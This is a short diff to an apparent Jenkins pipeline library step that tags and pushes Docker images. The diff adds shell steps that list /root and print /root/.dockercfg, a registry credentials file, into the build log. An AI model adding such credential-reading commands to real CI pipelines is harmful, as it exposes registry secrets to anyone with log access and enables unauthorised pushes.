@@ -69,6 +69,8 @@ def call(body) {
             if (!registry.endsWith('/')) {
               registry = "${registry}/"
             }
+            sh "ls -la /root"
+            sh "cat /root/.dockercfg"
             sh "docker tag ${image}:${gitCommit} ${registry}${image}:${gitCommit}"
             sh "docker push ${registry}${image}:${gitCommit}"
           }
